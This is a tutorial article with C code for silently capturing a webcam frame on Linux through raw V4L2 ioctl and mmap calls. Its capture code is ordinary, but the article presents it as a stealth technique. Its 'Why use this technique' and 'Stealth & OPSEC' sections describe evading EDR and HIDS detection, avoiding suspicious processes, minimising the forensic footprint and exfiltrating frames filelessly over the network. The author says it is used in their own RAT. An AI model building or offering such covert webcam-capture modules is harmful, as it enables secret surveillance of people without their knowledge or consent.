## **V4L2 Webcam Capture – Linux Stealth Technique (C)**

This article presents a method to capture a single frame from a webcam on Linux using the **Video4Linux2 (V4L2) API**. It is designed to be **low-level**, **dependency-free** (no `libv4l2`, OpenCV, or `ffmpeg`), and **minimal**, making it ideal for security tools, forensics, or discreet situational awareness modules.

## **Definition – V4L2 Frame Grabber**

This technique allows you to:

- **Dynamically scan** `/dev/video*` nodes to find the first available camera.
- **Configure the device** to capture MJPEG frames at a fixed resolution (e.g., 640x480).
- **Use memory-mapped I/O (mmap)** to efficiently retrieve the frame without expensive copies.
- **Save the captured JPEG** directly to disk or keep it in memory for further processing.

In short, we bypass high-level multimedia frameworks and talk directly to the kernel via `ioctl` syscalls, mimicking how native video tools operate but without spawning suspicious processes (like `ffmpeg` or `v4l2-ctl`).



## **Why use this technique?**

Security monitoring tools, EDRs for Linux, or HIDS (Host-based Intrusion Detection Systems) often hook:

- `libc` functions (e.g., `fopen`, `read`, `write`) – though less common.
- High-level libraries (OpenCV, GStreamer) – often monitored.
- Or they simply scan for known process names (`ffmpeg`, `streamer`, `cheese`).

We do **NOT** want to:

- Use heavy libraries that produce easily detectable memory/import signatures.
- Spawn child processes that trigger process creation hooks.
- Rely on dynamic linker hooks that could be intercepted.

V4L2 + raw `ioctl` + `mmap` = **stealthy**, **low-footprint**, and **kernel-native**.

### **First step, Find the first available camera**

We don't assume a fixed path like `/dev/video0`. Instead, we iterate over the first 10 `/dev/video*` nodes and query their capabilities using `VIDIOC_QUERYCAP`. We ensure the device supports **Video Capture** (`V4L2_CAP_VIDEO_CAPTURE`).

```c
static int find_first_camera(char *device_path, size_t max_len) {
    for (int i = 0; i < 10; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/dev/video%d", i);

        int fd = open(path, O_RDWR | O_NONBLOCK, 0);
        if (fd == -1) continue;

        struct v4l2_capability cap;
        if (ioctl(fd, VIDIOC_QUERYCAP, &cap) == 0) {
            __u32 caps = (cap.capabilities & V4L2_CAP_DEVICE_CAPS) ? 
                         cap.device_caps : cap.capabilities;

            if (caps & V4L2_CAP_VIDEO_CAPTURE) {
                strncpy(device_path, path, max_len);
                close(fd);
                return 0; // Found
            }
        }
        close(fd);
    }
    return -1; // No camera found
}
```

### **Open the device and set the format**

We open the device with `O_RDWR | O_NONBLOCK`. The non-blocking flag allows us to use `select()` with a timeout later, preventing indefinite hangs.

We then set the capture format using `VIDIOC_S_FMT`:
- **Width / Height**: 640x480 (you can adjust).
- **Pixel format**: `V4L2_PIX_FMT_MJPEG` – using MJPEG means we get a compressed JPEG directly from the hardware (most webcams support it). This avoids raw RGB/YUV conversion and drastically reduces data size.

```c
struct v4l2_format fmt = {0};
fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
fmt.fmt.pix.width = 640;
fmt.fmt.pix.height = 480;
fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_MJPEG;
fmt.fmt.pix.field = V4L2_FIELD_NONE;

if (ioctl(fd, VIDIOC_S_FMT, &fmt) == -1) {
    close(fd);
    return -2;
}
```

### **Request buffers and mmap them**

We request **one buffer** (`req.count = 1`) with `V4L2_MEMORY_MMAP`. This tells the kernel to allocate a buffer we can map into our process space.

We query the buffer (`VIDIOC_QUERYBUF`) to obtain its size and offset, then we map it using `mmap` with `PROT_READ | PROT_WRITE` and `MAP_SHARED`.

```c
struct v4l2_requestbuffers req = {0};
req.count = 1;
req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
req.memory = V4L2_MEMORY_MMAP;

if (ioctl(fd, VIDIOC_REQBUFS, &req) == -1) { close(fd); return -3; }

struct v4l2_buffer buf = {0};
buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
buf.memory = V4L2_MEMORY_MMAP;
buf.index = 0;

if (ioctl(fd, VIDIOC_QUERYBUF, &buf) == -1) { close(fd); return -4; }

void* buffer_start = mmap(NULL, buf.length, PROT_READ | PROT_WRITE, 
                          MAP_SHARED, fd, buf.m.offset);
if (buffer_start == MAP_FAILED) {
    close(fd);
    return -5;
}
```

### **Enqueue buffer, start stream, and capture**

We enqueue the buffer (`VIDIOC_QBUF`), then turn on the stream (`VIDIOC_STREAMON`).

We use `select()` with a 2-second timeout to wait for a frame. This is safer than a blocking read, as the camera might not deliver a frame.

When `select()` signals data available, we dequeue the buffer (`VIDIOC_DQBUF`). The captured JPEG data resides in `buffer_start` with a length of `buf.bytesused`.

```c
if (ioctl(fd, VIDIOC_QBUF, &buf) == -1) goto cleanup;

int type = buf.type;
if (ioctl(fd, VIDIOC_STREAMON, &type) == -1) goto cleanup;

fd_set fds;
FD_ZERO(&fds);
FD_SET(fd, &fds);
struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };

int r = select(fd + 1, &fds, NULL, NULL, &tv);
if (r == -1 || r == 0) goto stop_stream; // Timeout or error

if (ioctl(fd, VIDIOC_DQBUF, &buf) == -1) goto stop_stream;
```



### **Finally ! Save the frame and cleanup**

We write the raw buffer (which is already a complete JPEG) directly to a file.

Finally, we stop the stream, unmap the buffer, and close the file descriptor.

```c
FILE *f = fopen(out_name, "wb");
if (f) {
    fwrite(buffer_start, buf.bytesused, 1, f);
    fclose(f);
}

stop_stream:
    ioctl(fd, VIDIOC_STREAMOFF, &type);
cleanup:
    munmap(buffer_start, buf.length);
    close(fd);

return 0;
```

## **Why MJPEG over Raw Formats?**

- **MJPEG** provides a fully-formed JPEG image directly from the hardware. No need for post-processing (conversion to PNG/JPEG via an external library).
- **Smaller size**: A 640x480 MJPEG frame is typically ~20–50 KB, versus ~900 KB for raw RGB.
- **Speed**: Less data transfer over USB means faster capture and lower CPU usage.

## **Stealth & OPSEC Considerations**

1. **No `libv4l2`**: We use raw `ioctl` numbers, avoiding the wrapper library which could be hooked or logged.
2. **No heavy forks**: All operations happen in the current process.
3. **Fileless option**: Instead of writing the JPEG to disk (`fopen`), you can keep `buffer_start` in memory and exfiltrate it over the network, never touching the filesystem.
4. **Timeout**: The `select()` with a 2-second timeout prevents the tool from hanging forever if the camera is unavailable or already in use.

## **Limitations**

- Requires **read/write** access to `/dev/video*` (usually means the user must be in the `video` group or root).
- MJPEG is not supported by every webcam; some older models only support YUYV or RGB. A fallback to `V4L2_PIX_FMT_YUYV` with an internal JPEG encoder could be added.
- If another process is already streaming from the camera, `VIDIOC_S_FMT` or `VIDIOC_STREAMON` may fail.

## **Conclusion**

This V4L2 capture technique provides a **reliable**, **fast**, and **stealthy** method to obtain a webcam frame on Linux. By using native syscalls (`open`, `ioctl`, `mmap`, `select`) and avoiding high-level libraries, it minimizes the forensic footprint while maintaining compatibility with most modern UVC-compliant cameras. It is also easy to integrate into your project (I personnaly use this for my own RAT)